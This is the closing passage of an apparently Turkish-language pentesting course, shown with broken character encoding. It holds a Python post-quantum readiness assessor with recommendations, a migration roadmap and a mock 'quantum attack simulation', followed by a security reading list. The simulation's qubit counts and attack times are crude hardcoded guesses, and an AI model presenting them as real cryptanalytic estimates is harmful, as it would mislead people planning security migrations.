            'vulnerable_algorithms': ['DH-Group14', 'RSA-2048'],
            'quantum_safe_alternatives': {
                'DH-Group14': 'CRYSTALS-Kyber',
                'RSA-2048': 'CRYSTALS-Dilithium'
            }
        }
        
        return vpn_info
    
    def _calculate_quantum_risk_level(self, threats):
        """Kuantum risk seviyesi hesaplama"""
        if not threats:
            return 'low'
        
        critical_threats = [t for t in threats if t['impact'] == 'critical']
        high_threats = [t for t in threats if t['impact'] == 'high']
        
        if critical_threats:
            return 'critical'
        elif high_threats:
            return 'high'
        else:
            return 'medium'
    
    def _generate_quantum_safe_recommendations(self, assessment):
        """Kuantum g√ºvenli √∂neriler olu≈ütur"""
        recommendations = []
        
        # SSL/TLS √∂nerileri
        if 'ssl_analysis' in assessment:
            recommendations.extend([
                "TLS 1.3 ile kuantum diren√ßli cipher suite'leri kullanƒ±n",
                "CRYSTALS-Kyber anahtar deƒüi≈üimi implementasyonu planlayƒ±n",
                "Hibrit yakla≈üƒ±m: Mevcut + kuantum diren√ßli algoritmalar",
                "Sertifika otoritelerinden kuantum diren√ßli sertifikalar talep edin"
            ])
        
        # SSH √∂nerileri
        if 'ssh_analysis' in assessment:
            recommendations.extend([
                "OpenSSH'ƒ±n kuantum diren√ßli anahtar deƒüi≈üimi desteƒüini bekleyin",
                "Post-quantum SSH implementasyonlarƒ±nƒ± test edin",
                "Anahtar boyutlarƒ±nƒ± ge√ßici olarak artƒ±rƒ±n (RSA 4096+)",
                "SSH anahtar rotasyonunu sƒ±kla≈ütƒ±rƒ±n"
            ])
        
        # VPN √∂nerileri
        if 'vpn_analysis' in assessment:
            recommendations.extend([
                "IPSec i√ßin post-quantum IKE implementasyonlarƒ±nƒ± ara≈ütƒ±rƒ±n",
                "WireGuard'ƒ±n kuantum diren√ßli versiyonunu takip edin",
                "VPN vendor'larƒ±ndan kuantum roadmap'i talep edin"
            ])
        
        # Genel √∂neriler
        recommendations.extend([
            "Kuantum bilgisayar geli≈ümelerini d√ºzenli olarak takip edin",
            "Crypto-agility prensiplerini uygulayƒ±n",
            "NIST Post-Quantum Cryptography standardizasyonunu izleyin",
            "Kuantum g√ºvenli ge√ßi≈ü planƒ± hazƒ±rlayƒ±n"
        ])
        
        return recommendations
    
    def simulate_quantum_attack(self, target_algorithm, key_size):
        """Kuantum saldƒ±rƒ± sim√ºlasyonu"""
        attack_simulation = {
            'algorithm': target_algorithm,
            'key_size': key_size,
            'quantum_attack_feasibility': {},
            'estimated_qubits_required': 0,
            'estimated_time_classical': 'years',
            'estimated_time_quantum': 'hours'
        }
        
        # Shor's Algorithm i√ßin RSA/ECC
        if target_algorithm.lower() in ['rsa', 'ecc', 'ecdsa', 'ecdh']:
            if target_algorithm.lower() == 'rsa':
                attack_simulation['estimated_qubits_required'] = key_size * 2
                attack_simulation['quantum_attack_feasibility'] = {
                    'current_quantum_computers': 'not_feasible',
                    'near_term_quantum_computers': 'potentially_feasible',
                    'fault_tolerant_quantum_computers': 'feasible'
                }
            else:  # ECC
                attack_simulation['estimated_qubits_required'] = key_size * 6
                attack_simulation['quantum_attack_feasibility'] = {
                    'current_quantum_computers': 'not_feasible',
                    'near_term_quantum_computers': 'potentially_feasible',
                    'fault_tolerant_quantum_computers': 'feasible'
                }
        
        # Grover's Algorithm i√ßin simetrik ≈üifreleme
        elif target_algorithm.lower() in ['aes', 'des', '3des']:
            effective_key_size = key_size // 2  # Grover's algorithm
            attack_simulation['estimated_qubits_required'] = key_size
            attack_simulation['quantum_attack_feasibility'] = {
                'current_quantum_computers': 'not_feasible',
                'near_term_quantum_computers': 'not_feasible',
                'fault_tolerant_quantum_computers': 'feasible' if effective_key_size < 128 else 'difficult'
            }
        
        return attack_simulation
    
    def generate_quantum_readiness_report(self, assessments):
        """Kuantum hazƒ±rlƒ±k raporu olu≈ütur"""
        report = {
            'metadata': {
                'report_type': 'quantum_readiness_assessment',
                'generation_date': datetime.now().isoformat(),
                'nist_pqc_status': 'standardization_in_progress',
                'quantum_threat_timeline': '2030-2040'
            },
            'executive_summary': {
                'total_services_assessed': len(assessments),
                'quantum_vulnerable_services': len([a for a in assessments if a['risk_level'] in ['high', 'critical']]),
                'immediate_action_required': len([a for a in assessments if a['risk_level'] == 'critical']),
                'overall_quantum_readiness': self._calculate_overall_readiness(assessments)
            },
            'detailed_assessments': assessments,
            'migration_roadmap': self._generate_migration_roadmap(assessments),
            'recommended_quantum_safe_algorithms': self.quantum_resistant_algorithms
        }
        
        # Raporu dosyaya kaydet
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_file = f'quantum_readiness_report_{timestamp}.json'
        
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"[+] Kuantum Hazƒ±rlƒ±k Raporu olu≈üturuldu: {report_file}")
        return report_file
    
    def _calculate_overall_readiness(self, assessments):
        """Genel kuantum hazƒ±rlƒ±k seviyesi hesaplama"""
        if not assessments:
            return 'unknown'
        
        risk_counts = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0}
        
        for assessment in assessments:
            risk_level = assessment.get('risk_level', 'unknown')
            if risk_level in risk_counts:
                risk_counts[risk_level] += 1
        
        total = len(assessments)
        critical_ratio = risk_counts['critical'] / total
        high_ratio = risk_counts['high'] / total
        
        if critical_ratio > 0.5:
            return 'not_ready'
        elif critical_ratio + high_ratio > 0.7:
            return 'partially_ready'
        elif critical_ratio + high_ratio > 0.3:
            return 'mostly_ready'
        else:
            return 'quantum_ready'
    
    def _generate_migration_roadmap(self, assessments):
        """Kuantum g√ºvenli ge√ßi≈ü yol haritasƒ±"""
        roadmap = {
            'phase_1_immediate': {
                'timeline': '0-6 months',
                'actions': [
                    'Mevcut kriptografik envanteri √ßƒ±karƒ±n',
                    'Kritik sistemleri belirleyin',
                    'Kuantum g√ºvenli algoritma testlerine ba≈ülayƒ±n'
                ]
            },
            'phase_2_preparation': {
                'timeline': '6-18 months',
                'actions': [
                    'Hibrit kriptografik √ß√∂z√ºmler uygulayƒ±n',
                    'Vendor roadmap'lerini deƒüerlendirin',
                    'Pilot kuantum g√ºvenli implementasyonlar yapƒ±n'
                ]
            },
            'phase_3_migration': {
                'timeline': '18-36 months',
                'actions': [
                    'Kritik sistemlerde kuantum g√ºvenli algoritmalara ge√ßin',
                    'Eski algoritmalarƒ± a≈üamalƒ± olarak kaldƒ±rƒ±n',
                    'Kapsamlƒ± test ve doƒürulama yapƒ±n'
                ]
            },
            'phase_4_completion': {
                'timeline': '36+ months',
                'actions': [
                    'T√ºm sistemlerde kuantum g√ºvenli kriptografi kullanƒ±n',
                    'S√ºrekli izleme ve g√ºncelleme s√ºre√ßleri kurun',
                    'Kuantum g√ºvenlik sertifikasyonlarƒ± alƒ±n'
                ]
            }
        }
        
        return roadmap

# Kullanƒ±m √∂rneƒüi
if __name__ == "__main__":
    # Quantum-Safe Network Pentester ba≈ülat
    quantum_pentester = QuantumSafeNetworkPentester()
    
    # Test hedefleri
    targets = [
        ('192.168.1.100', 443),  # HTTPS
        ('192.168.1.100', 22),   # SSH
        ('192.168.1.100', 500),  # IPSec
    ]
    
    assessments = []
    
    for host, port in targets:
        print(f"[+] Kuantum zafiyet deƒüerlendirmesi: {host}:{port}")
        assessment = quantum_pentester.assess_quantum_vulnerability(host, port)
        assessments.append(assessment)
        
        print(f"    Risk Seviyesi: {assessment['risk_level']}")
        print(f"    Tespit Edilen Tehditler: {len(assessment['quantum_threats'])}")
    
    # Kuantum saldƒ±rƒ± sim√ºlasyonlarƒ±
    print("\n[+] Kuantum saldƒ±rƒ± sim√ºlasyonlarƒ±:")
    
    algorithms_to_test = [
        ('RSA', 2048),
        ('ECC', 256),
        ('AES', 256)
    ]
    
    for alg, key_size in algorithms_to_test:
        simulation = quantum_pentester.simulate_quantum_attack(alg, key_size)
        print(f"    {alg}-{key_size}: {simulation['estimated_qubits_required']} qubit gerekli")
    
    # Kuantum hazƒ±rlƒ±k raporu olu≈ütur
    report_file = quantum_pentester.generate_quantum_readiness_report(assessments)
    
    print(f"\n[+] Kuantum g√ºvenlik deƒüerlendirmesi tamamlandƒ±!")
    print(f"[+] Rapor dosyasƒ±: {report_file}")
```

## üìö Kaynaklar ve Referanslar

### üìñ Kitaplar
- **"The Hacker Playbook 3"** - Peter Kim
- **"Penetration Testing: A Hands-On Introduction to Hacking"** - Georgia Weidman
- **"Network Security Assessment"** - Chris McNab
- **"Nmap Network Scanning"** - Gordon Fyodor Lyon
- **"Metasploit: The Penetration Tester's Guide"** - David Kennedy
- **"Gray Hat Hacking"** - Allen Harper, Shon Harris
- **"The Shellcoder's Handbook"** - Chris Anley, John Heasman

### üåê √áevrimi√ßi Kaynaklar
- **OWASP Testing Guide**: https://owasp.org/www-project-web-security-testing-guide/
- **NIST Cybersecurity Framework**: https://www.nist.gov/cyberframework
- **SANS Penetration Testing**: https://www.sans.org/cyber-aces/
- **Offensive Security**: https://www.offensive-security.com/
- **Exploit Database**: https://www.exploit-db.com/
- **CVE Details**: https://www.cvedetails.com/
- **Security Focus**: https://www.securityfocus.com/

### üõ†Ô∏è Ara√ß Dok√ºmantasyonlarƒ±
- **Nmap Reference Guide**: https://nmap.org/book/
- **Metasploit Documentation**: https://docs.rapid7.com/metasploit/
- **Burp Suite Documentation**: https://portswigger.net/burp/documentation
- **Wireshark User Guide**: https://www.wireshark.org/docs/
- **Aircrack-ng Documentation**: https://www.aircrack-ng.org/documentation.html
- **John the Ripper Documentation**: https://www.openwall.com/john/doc/

### üéì Sertifikasyon Programlarƒ±
- **OSCP (Offensive Security Certified Professional)**
- **CEH (Certified Ethical Hacker)**
- **GPEN (GIAC Penetration Tester)**
- **CPENT (Certified Penetration Testing Professional)**
- **CISSP (Certified Information Systems Security Professional)**
- **CISM (Certified Information Security Manager)**

### üèÜ CTF Platformlarƒ±
- **HackTheBox**: https://www.hackthebox.eu/
- **TryHackMe**: https://tryhackme.com/
- **VulnHub**: https://www.vulnhub.com/
- **OverTheWire**: https://overthewire.org/wargames/
- **PicoCTF**: https://picoctf.org/
- **SANS Holiday Hack Challenge**: https://holidayhackchallenge.com/

### ‚öñÔ∏è Yasal ve Etik Kaynaklar
- **EC-Council Code of Ethics**: https://www.eccouncil.org/code-of-ethics/
- **SANS Ethics**: https://www.sans.org/about/ethics/
- **Penetration Testing Execution Standard**: http://www.pentest-standard.org/
- **NIST SP 800-115**: https://csrc.nist.gov/publications/detail/sp/800-115/final

### üî¨ Ara≈ütƒ±rma ve Akademik Kaynaklar
- **IEEE Xplore Digital Library**: https://ieeexplore.ieee.org/
- **ACM Digital Library**: https://dl.acm.org/
- **arXiv Computer Science**: https://arxiv.org/list/cs/recent
- **Google Scholar**: https://scholar.google.com/
- **DBLP Computer Science Bibliography**: https://dblp.org/

### üì∞ G√ºvenlik Haberleri ve Bloglar
- **Krebs on Security**: https://krebsonsecurity.com/
- **Schneier on Security**: https://www.schneier.com/
- **The Hacker News**: https://thehackernews.com/
- **Dark Reading**: https://www.darkreading.com/
- **InfoSec Institute**: https://www.infosecinstitute.com/

---

*Son g√ºncelleme: 2025 | Seviye: Orta | S√ºre: 2 hafta*